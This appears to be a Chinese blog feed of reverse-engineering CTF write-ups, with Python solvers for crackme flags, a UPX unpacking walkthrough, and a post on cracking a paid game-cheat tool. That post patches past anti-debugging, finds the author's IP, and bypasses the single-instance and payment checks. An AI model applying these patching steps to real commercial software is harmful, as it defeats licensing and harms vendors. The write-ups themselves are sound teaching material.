<p><img src="https://s2.ax1x.com/2019/07/28/e19pzn.png"></p>
<p>就是一个十六进制转数字的函数，上层函数中第一个参数的返回值乘16再加第二个参数的返回值，合在一起就是把两个十=十六进制字符转化成一个数字，至此就已分析完毕，上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&#x27;664e06226625425d562e766e042d422c072c45692d125c7e6552606954646643&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;flag&#123;hello_player_come_on_hahah&#125;&#x27;</span></span><br><span class="line">str3=<span class="string">&#x27;&#x27;</span></span><br><span class="line">arr1=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">48</span>&lt;=ord(c)&lt;=<span class="number">57</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)<span class="number">-48</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">65</span>&lt;=ord(c)&lt;=<span class="number">70</span>):</span><br><span class="line">        <span class="keyword">return</span> ord(c)<span class="number">-55</span></span><br><span class="line">    <span class="keyword">if</span>(ord(c)&lt;=<span class="number">96</span> <span class="keyword">or</span> ord(c)&gt;<span class="number">102</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> ord(c)<span class="number">-87</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">63</span>,<span class="number">2</span>):</span><br><span class="line">    arr1.append(<span class="number">16</span>*f(str1[i])+f(str1[i+<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    str3+=chr(ord(str2[i])^arr1[i]^i)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;file.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str3)</span><br></pre></td></tr></table></figure>
<p>在线计算所创建文件的md5为<code>    914a7b9df69eab5b74b9edb7070e53e8</code>，加上flag{}就ok了。</p>
<h2 id="not-only-smc"><a href="#not-only-smc" class="headerlink" title="not only smc"></a>not only smc</h2><p>有个UPX的壳，shellcode里对upx进行了检测，脱壳后无法运行，就用ollydbg带壳调试，还有smc(自改变代码)，下<code>VirtualAlloc</code>断点，找smc解密，断点会断好几次，在程序结束前最后一次断下的时候<code>Ctrl+F9</code>运行到返回，找到到smc解密，是取输入字符串第九位开始后面的五位反复与给定字符串异或：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e1zncq.png"></p>
<p>因为自解密出来是一个函数，而VC下stdcall的函数头基本是固定的，像是这样：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e1zo5Q.png"></p>
<p>由此可以猜测五位解密字符，反复尝试后确定是<code>jUnk_</code>，之后步过解密出来的函数，输入的数据会发生变化，说明函数中对输入数据进行了加密，步入分析，有很多junk code(垃圾代码)，用来迷惑我们的，在输入的数据处下内存断点找到对数据进行加密的关键代码，是将输入的字符串与给定字符串一一异或：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e3knmR.png"></p>
<p>这个函数结束后继续步过，到后面又有一个函数再次改变了输入的数据，步入分析，还是有junk code，还是靠断点找到关键位置，分析得出这是一个三重嵌套循环异或，输入字符串的不同位之间异或是两层，外层还循环了65次</p>
<p>总的解密脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = [<span class="number">0xE8</span>, <span class="number">0x90</span>, <span class="number">0x24</span>, <span class="number">0xE6</span>, <span class="number">0x0A</span>, <span class="number">0xE3</span>, <span class="number">0xF7</span>, <span class="number">0xA8</span>, <span class="number">0x09</span>, <span class="number">0xC0</span>, <span class="number">0x35</span>, <span class="number">0x74</span>, <span class="number">0x26</span>, <span class="number">0x4D</span>, <span class="number">0xA0</span>, <span class="number">0x2D</span>,</span><br><span class="line">       <span class="number">0xD6</span>, <span class="number">0x1A</span>, <span class="number">0x5A</span>, <span class="number">0x5C</span>, <span class="number">0x16</span>, <span class="number">0x2D</span>, <span class="number">0xF0</span>, <span class="number">0x46</span>, <span class="number">0x44</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0x83</span>, <span class="number">0x5B</span>, <span class="number">0xBE</span>, <span class="number">0x86</span>, <span class="number">0xAC</span>]</span><br><span class="line">key = [<span class="number">0xBB</span>, <span class="number">0x35</span>, <span class="number">0xAF</span>, <span class="number">0x29</span>, <span class="number">0xA3</span>, <span class="number">0x1D</span>, <span class="number">0x97</span>, <span class="number">0x11</span>, <span class="number">0x8B</span>, <span class="number">0x05</span>, <span class="number">0x7F</span>, <span class="number">0xF9</span>, <span class="number">0x73</span>, <span class="number">0xED</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>,</span><br><span class="line">       <span class="number">0x5B</span>, <span class="number">0xD5</span>, <span class="number">0x4F</span>, <span class="number">0xC9</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x37</span>, <span class="number">0xB1</span>, <span class="number">0x2B</span>, <span class="number">0xA5</span>, <span class="number">0x1F</span>, <span class="number">0x99</span>, <span class="number">0x13</span>, <span class="number">0x8D</span>, <span class="number">0x07</span>, <span class="number">0x81</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>):</span><br><span class="line">    j = <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">while</span> j &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(j):</span><br><span class="line">            ans[j+k] = ans[j+k] ^ ans[k]</span><br><span class="line">        j = j &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    ans[i]^=key[i]</span><br><span class="line">    print(chr(ans[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SMc_AnD_jUnk_C0de_1s_s0_fuunn~!</span></span><br></pre></td></tr></table></figure>

<h2 id="RE-Cirno"><a href="#RE-Cirno" class="headerlink" title="RE_Cirno"></a>RE_Cirno</h2><p>给了一张图片，下载下来WinHex打开发现有PK头，于是改后缀名为zip打开得到exe，IDA看main函数，很简单的程序，给定一个字符串，遍历字符串全部加9但是却没有保存，然后有个提示：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e3ONhn.png"></p>
<p>“9层栅栏”指栅栏密码，“反向”指逆序，先把字符串加9的结果算出来为<code>&quot;of&#125;e8lhz9n~r:9J&#123;t8p&#123;jg|&quot;</code>，这个东西栅栏解码后也不可能是flag，再看看汇编代码：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e3XtbD.png"></p>
<p>发现加9之后还异或了9，此处是IDA7.0伪代码处理的bug，换IDA6.8就会正常显示异或9，重新计算结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">arr1=[<span class="number">115</span>,<span class="number">94</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">103</span>,<span class="number">47</span>,<span class="number">107</span>,<span class="number">114</span>,<span class="number">65</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">105</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">48</span>,<span class="number">113</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">47</span>,<span class="number">92</span>,<span class="number">116</span>,<span class="number">93</span>,<span class="number">102</span>]</span><br><span class="line">str1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    str1+=chr((arr1[i]+<span class="number">9</span>)^<span class="number">9</span>)</span><br><span class="line">print(str1[::<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#fotl1eas0gvw&#123;30Cr&#125;1yrcnu</span></span><br></pre></td></tr></table></figure>
<p>这个看起来就顺眼多了，有”flag”，有花括号，也有”Cirno”，接下来就是解栅栏密码，根据开头<code>&quot;flag&#123;&quot;</code>的格式还有提示的<code>&quot;9层&quot;</code>，确定应该是3*9的栅栏，但是字符串只有24位，应该要加3位，边做边猜最后确定字符串修改为<code>&quot;fotl1eas0gvw&#123;30Cr&#125;1y_rc_nu_&quot;</code>解码后得到<code>&quot;&quot;flag&#123;C1rno1sv3rycute0w0&#125;___</code>，将加上的下划线去掉得flag。</p>
<h2 id="babyLoginPlus"><a href="#babyLoginPlus" class="headerlink" title="babyLoginPlus"></a>babyLoginPlus</h2><p>有VM加密，IDA先看看，主函数长这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_401510();</span><br><span class="line">  sub_4013C0((<span class="keyword">int</span>)&amp;unk_40B0B0);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)sub_401540((<span class="keyword">char</span> *)&amp;unk_408240, dword_40823C, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进第一个函数，里面对<code>byte_408034</code>进行赋值，长这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_401510</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v0 = dword_408030;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_408030 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="keyword">char</span> *)&amp;unk_408160;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *v2;</span><br><span class="line">      v2 += <span class="number">2</span>;</span><br><span class="line">      byte_408034[result++] = (v3 ^ <span class="number">0x66</span>) - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; v0 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>值我们不用算，动态调试的时候可以看，之后第二个函数是申请内存之后进行4个拷贝，长这样：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e8A8Fx.png"></p>
<p>ollydbg里面看这四个拷贝的地方长这样(最上面16个字符是输入的字符串)：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e8A00A.png"></p>
<p>在输入的字符串处下内存访问断点，一步一步找能找到程序把输入的字符串一个一个的转移到另一个地方：</p>
<p><img src="https://s2.ax1x.com/2019/07/29/e8EYEn.png"></p>
<p>跟过去下内存断点就能找到转移后对字符串进行的一系列操作，最终解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">src = [<span class="number">0x32</span>, <span class="number">0x26</span>, <span class="number">0x18</span>, <span class="number">0x21</span>, <span class="number">0x41</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x29</span>, <span class="number">0x35</span>, <span class="number">0x12</span>, <span class="number">0x20</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x1C</span>,</span><br><span class="line">       <span class="number">0x68</span>, <span class="number">0x2D</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x47</span>, <span class="number">0x7F</span>, <span class="number">0x44</span>, <span class="number">0x09</span>, <span class="number">0x1E</span>, <span class="number">0x75</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x19</span>, <span class="number">0x34</span>, <span class="number">0x76</span>, <span class="number">0x47</span>,</span><br><span class="line">       <span class="number">0x14</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x76</span>, <span class="number">0x58</span>]</span><br><span class="line">key = [<span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x6E</span>, <span class="number">0x69</span>, <span class="number">0x73</span>,</span><br><span class="line">       <span class="number">0x63</span>, <span class="number">0x5F</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x38</span>, <span class="number">0x5F</span>, <span class="number">0x42</span>, <span class="number">0x79</span>, <span class="number">0x2E</span>, <span class="number">0x5A</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">       <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(src)):</span><br><span class="line">    flag += chr(((src[i]<span class="number">-0x6</span>) ^ <span class="number">0x26</span> ^ key[i])+<span class="number">9</span>)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;_p1us_babyL0gin_pPpPpPpPp_p1us_&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次外挂破解</title>
    <url>/2019/05/24/A_Re_writeup/</url>
    <content><![CDATA[<p>学校信息安全实验室招新，学长找了一个游戏的外挂给我们破解，游戏叫Risk of Rain 2。</p>
<p>外挂界面：</p>
<p><img src="https://s2.ax1x.com/2019/09/11/nahQRH.png"></p>
<p><strong>要求：</strong></p>
<ul>
<li><ol>
<li>找到作者的IP；</li>
</ol>
</li>
<li><ol start="2">
<li>让外挂软件可以多开；</li>
</ol>
</li>
<li><ol start="3">
<li>破解外挂的付费功能，使用本来需要付费才能使用的无限跳跃。</li>
</ol>
</li>
</ul>
<p>64位程序，用x64dbg打开调试，F9一直跑，发现窗口还没打开程序就结束了，应该有反调试，去找常用反调试，可以 找到IsDebuggerPresent:</p>
<p><img src="https://s2.ax1x.com/2019/09/11/nahWYF.png"></p>
<p>双击找到该位置下断点后重新运行，程序会停在这里，再从堆栈调用里找到函数的入口点，发现关键跳转</p>
<p><img src="https://s2.ax1x.com/2019/09/11/nahIyR.png"></p>
<p><img src="https://s2.ax1x.com/2019/09/11/nah7ex.png"></p>
<p>操作一下这个跳转就可以打开程序了，可以把上面的test改成cmp，也可以直接nop掉跳转，方法不唯一。</p>
<p>IP很容易找，甚至不需要调试，直接搜索所有字符串，正则表达式筛选IP的格式就能找到</p>
<p><img src="https://s2.ax1x.com/2019/09/11/nahbTK.png"></p>
<p>破解多开我一开始是先开一个程序再用x64调试一个程序，一直单步步过，当步过一个call之后程序弹窗提示不能多开时就表示弹窗在这个call里面，于是下断点重开步入继续步过，找了很久之后找到了弹窗，往上可以找到关键跳转。</p>
<p><img src="https://s2.ax1x.com/2019/09/11/nahXfe.png"></p>
<p>后来发现其实可以直接搜索MessageBoxW找到它再从调用堆栈找到弹窗位置：</p>
<p><img src="https://s2.ax1x.com/2019/09/11/na4DhD.png"></p>
<p>破解付费，因为提示付费时有弹窗，所以也可以在MessageBoxW下断点然后按CTRL+1使用付费功能程序就停在断点处，从调用堆栈找到函数入口，往上找跳到这里来的关键跳转</p>
<p><img src="https://s2.ax1x.com/2019/09/11/na4WHP.png"></p>
<p>改了之后就可以使用付费功能了，但是打了补丁之后外挂程序就不能实现开挂功能，猜想可能是开始的时候有检测程序是否被修改。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>SNERT招新题RE部分writeup</title>
    <url>/2019/10/19/snertre/</url>
    <content><![CDATA[<p>学校SNERT团队招新题中的RE部分，由我和另一个朋友出题，我审题，写个详细一点的writeup给刚接触的学弟学妹。</p>
<h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>运行程序界面如下：</p>
<p><img src="https://s2.ax1x.com/2019/10/20/KK5I6U.png"></p>
<p>就是一般的输入flag的界面，32位程序，用32位IDA打开找到主函数(main),再按<code>F5</code>键转化成C语言伪代码：</p>
<p><img src="https://s2.ax1x.com/2019/10/20/KK70EQ.png"></p>
<p>就很明显能看到倒着的flag啊，复制过来倒转就行了，至于代码是用C++写的，内容是输入字符串之后将输入的字符串逆序后与图片中的逆序flag比较。另外因为这个题的flag就直接存在程序里面，只是逆序了一下，所以是可以直接用记事本之类的编辑文件打开找到这串比较明显的flag的，ollydbg也可以智能搜索搜出这串字符串。</p>
<p><img src="https://s2.ax1x.com/2019/10/20/KKHNGR.png"></p>
<h2 id="EasyRe2"><a href="#EasyRe2" class="headerlink" title="EasyRe2"></a>EasyRe2</h2><p>界面和上题一摸一样，直接用IDA打开是看不到函数的，因为程序有加壳，PEID查壳界面如下：</p>
<p><img src="https://s2.ax1x.com/2019/10/20/KKHXQ0.png"></p>
<p>可以看到<code>UPX</code>,是一种常见的压缩壳，这种壳很好脱，可以在网上找脱壳机，这里我们利用ESP定律手脱：<br>ollydbg打开，单步一次执行pushad，ESP发生变化变红：<br><img src="https://s2.ax1x.com/2019/10/27/Krg8Cq.png"><br>此时右键数据窗口跟随ESP并在该处下硬件访问断点：<br><img src="https://s2.ax1x.com/2019/10/27/KsKadA.png"><br>之后按F9运行程序，程序停在某处，然后就可以直接在这里dump程序：<br><img src="https://s2.ax1x.com/2019/10/27/KsKHL4.png"><br>之后就可以用IDA打开dump出来的程序看函数了，但是找不到主函数，不知道从该哪里开始分析，就先打开字符串窗口看看字符串，发现有”Wrong”,”You got it”等字符串，猜测应该就是核心代码所在的位置：<br><img src="https://s2.ax1x.com/2019/10/27/KsM8kn.png"><br>于是双击跟进，然后按X查看交叉引用，看看这个字符串在哪些地方被使用了，再跟进找到关键函数：<br><img src="https://s2.ax1x.com/2019/10/27/KsMwm4.png"><br><img src="https://s2.ax1x.com/2019/10/27/KsMst1.png"><br>然后上面那一串数字转化成字符就是flag了。</p>
<h2 id="EasyRe3"><a href="#EasyRe3" class="headerlink" title="EasyRe3"></a>EasyRe3</h2><p>程序运行还是要求输入flag，32位程序，无壳。<br>IDA打开，主函数伪代码如下：<br><img src="https://s2.ax1x.com/2019/10/27/KsYBJH.png"><br>判断输入字符串的长度后将输入的字符串第11位异或<code>0x2C</code>，之后遍历字符串挨个判断<code>qizi(i^2C)</code>是否等于<code>v4[i]+i</code>，都等于则跳转到<code>win()</code>函数，有不相等的则跳转到<code>GG()</code>函数，跟进<code>qizi()</code>函数分析：<br><img src="https://s2.ax1x.com/2019/10/27/KsY0Fe.png"><br>可以看出该函数是将<code>0x404040</code>处的数据拷贝到<code>v2</code>再返回<code>v2[a1^0x2C]</code>，<code>a1</code>是传进来的参数也就是上层函数的<code>i^0x2C</code>，这里又异或了一次同样的值，两次异或同一个值之后变回原值<code>i</code>，所以返回的实际就是<code>v2[i]</code>。然后我们跟进看<code>0x404040</code>处的数据是什么：<br><img src="https://s2.ax1x.com/2019/10/27/KsNeET.png"><br>这一长串就是数据了，然后用这串数据倒推需要我们输入的正确flag，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x66</span>, <span class="number">0x6d</span>, <span class="number">0x63</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x59</span>, <span class="number">0x4e</span>, <span class="number">0x6c</span>, <span class="number">0x67</span>, <span class="number">0x80</span>, <span class="number">0x26</span>, <span class="number">0x7d</span>, <span class="number">0x3d</span>, <span class="number">0x71</span>,</span><br><span class="line">     <span class="number">0x6d</span>, <span class="number">0x40</span>, <span class="number">0x83</span>, <span class="number">0x70</span>, <span class="number">0x86</span>, <span class="number">0x43</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x59</span>, <span class="number">0x89</span>, <span class="number">0x79</span>, <span class="number">0x73</span>, <span class="number">0x93</span>, <span class="number">0x98</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">        flag += chr((s[i]-i) ^ <span class="number">0x2c</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(s[i]-i)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># flag&#123;THe_w0r1d_1s_t0O_CraZy&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><p>运行程序要求输入flag，32位程序，无壳。<br>IDA查看主函数如下：<br><img src="https://s2.ax1x.com/2019/10/27/Ks0ajJ.png"><br>先判断长度为22后后遍历输入的字符串前21位，让每一个字符串异或它本身后面一个字符串，之后与变量<code>flag</code>比较，跟进查看<code>flag</code>变量的值：<br><img src="https://s2.ax1x.com/2019/10/27/Ks0oUP.png"><br>因为不知道最后一位字符是什么(其实可以猜测是’}’)，我们只能暴力，的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x1c</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0x42</span>, <span class="number">0x2d</span>, <span class="number">0x36</span>, <span class="number">0x5c</span>, <span class="number">0x6a</span>,</span><br><span class="line">     <span class="number">0x9</span>, <span class="number">0x33</span>, <span class="number">0x17</span>, <span class="number">0xb</span>, <span class="number">0x26</span>, <span class="number">0x39</span>, <span class="number">0x13</span>, <span class="number">0x1b</span>, <span class="number">0x4f</span>, <span class="number">0x5c</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag += chr(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">        flag += chr(ord(flag[<span class="number">-1</span>]) ^ s[<span class="number">20</span>-j])</span><br><span class="line">    print(flag[::<span class="number">-1</span>])<span class="comment">#反向输出</span></span><br></pre></td></tr></table></figure>
<p>在跑出来的众多结果中可以找到flag：<br><img src="https://s2.ax1x.com/2019/10/27/KsBsqs.png"><br>这里跑出来的结果都能通过程序的验证，但是只有这一个可以通过靶场的题。</p>
<h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>还是要求输入flag，还是32位程序，还是无壳。<br>主函数伪代码如下：<br><img src="https://s2.ax1x.com/2019/10/27/Ksy66U.png"><br>这个伪代码可能看起来有一点奇怪，因为这是用C++写的，但是分析方法是一样的，语言方面唯一需要注意的是<code>::v3</code>和<code>v3</code>是两个不同的东西，别问我为什么强调这一点…<br>还有就是<code>sub1()</code>和<code>sub2()</code>两个函数，是利用一个数组手动模拟的一个栈(先进后出)，<code>sub1()</code>是进栈，<code>sub2()</code>是出栈，意思说每次<code>sub2()</code>都会取出最近一个<code>sub1()</code>存进栈里的数据。函数伪代码如下：<br><img src="https://s2.ax1x.com/2019/10/27/KsyAW6.png"><br><img src="https://s2.ax1x.com/2019/10/27/KsyMTA.png"><br>其中<code>s</code>和<code>v7</code>是全局变量，跟进可查看<code>v7</code>的值是<code>-1</code>。<br>加密算法是用程序里程序里的一串字符串<code>s2</code>与输入的字符串异或，结果与<code>s1</code>比较。脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">18</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">17</span>, <span class="number">29</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">91</span>,</span><br><span class="line">       <span class="number">12</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">59</span>, <span class="number">18</span>, <span class="number">113</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">104</span>, <span class="number">3</span>]</span><br><span class="line">key = <span class="string">&#x27;this_is_fake_flag?&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    flag += chr(i ^ ord(key[i % <span class="number">18</span>]) ^ arr[i])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;thIs_i5_trUe_flag!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h2><p>题名为迷宫，32位程序，无壳，运行程序没有任何提示，试着随便输入一个东西，程序关闭，用ollydbg动态调试发现最后程序输出了一个”Wrong&gt;_&lt;”之后才关闭的，应该是懒惰的出题人没有设置暂停所以程序瞬间就关闭了我们看不到输出的提示，还有开头也没有输入提示”Please input the flag”之类的。<br>IDA查看主函数伪代码：<br><img src="https://s2.ax1x.com/2019/10/27/KywCAx.png"><br><img src="https://s2.ax1x.com/2019/10/27/KywRV1.png"><br><img src="https://s2.ax1x.com/2019/10/27/Ky0uM4.png"><br>可以看出程序先用两堆数据异或生成迷宫，<code>v17</code>表示横坐标，<code>v16</code>表示纵坐标，初始值都为0，即处于迷宫左上角，走到迷宫右下角即达到终点。之后遍历字符串，”u”表示向上走(up)，”d”表示向下走，”l”表示向左走，”r”表示向右走，每走一步会判断是否越界或者撞墙。表示迷宫的二维数组中值为1表示墙，值为0表示可以走。但存储两堆用来异或生成迷宫的字符串跟进无法看值，因为用的是string类而且在主函数外声明赋值的全局变量但其实搜索字符串能看到两串奇怪的字符串：<br><img src="https://s2.ax1x.com/2019/10/27/KyrJJ0.png"><br>用od继续调试，利用在ida中找到的生成迷宫的代码的地址，在ollydbg中找到该位置下断点,然后运行到该处跟随地址找到存储迷宫的位置：<br><img src="https://s2.ax1x.com/2019/10/27/Kysq41.png"><br>然后执行程序，迷宫生成：<br><img src="https://s2.ax1x.com/2019/10/27/Kyyw5R.png"><br>把迷宫按20*10画出来结果如图：<br><img src="https://s2.ax1x.com/2019/10/27/KygaVg.png"><br>之后就找一条路从左上到右下。</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>babymips(XCTF 4th-QCTF-2018)</title>
    <url>/2020/01/11/babymips/</url>
    <content><![CDATA[<p>mips的题，对mips指令不了解，边查边做弄了好久才弄出来。</p>
<p>32位mips架构elf文件无壳，ida打开查字符串找到主函数<code>sub4009A8</code>，先输入一个长度为32的字符串放在<code>0x48+var_2C</code>后将<code>0x48+var_30</code>置零：</p>
<p><img src="https://s2.ax1x.com/2020/01/11/l5lT5q.png"></p>
<p>之后用置零的<code>0x48+var_30</code>作为下标<code>i</code>遍历整个字符串进行加密，加密后取前5位与已知字符串比较：</p>
<p><img src="https://s2.ax1x.com/2020/01/11/l5J1ts.png"></p>
<p>加密部分逻辑如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    input[i]^=<span class="number">0x20</span>-i</span><br></pre></td></tr></table></figure>

<p>判断前5位之后再调用<code>sub_4007F0</code>函数继续判断，逻辑与上层函数相似，下标遍历从第6位到最后一位，分奇偶数进行不同的加密，最后与已知字符串比较：</p>
<p><img src="https://s2.ax1x.com/2020/01/11/l5YRx0.png"></p>
<p>加密部分逻辑如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>):</span><br><span class="line">        input[i]=(input[i]&gt;&gt;<span class="number">2</span>)|(input[i]&lt;&lt;<span class="number">6</span>)<span class="comment">#循环右移2位</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        input[i]=(input[i]&gt;&gt;<span class="number">6</span>)|(input[i]&lt;&lt;<span class="number">2</span>)<span class="comment">#循环左移2位</span></span><br></pre></td></tr></table></figure>

<p>最后脚本如下：</p>
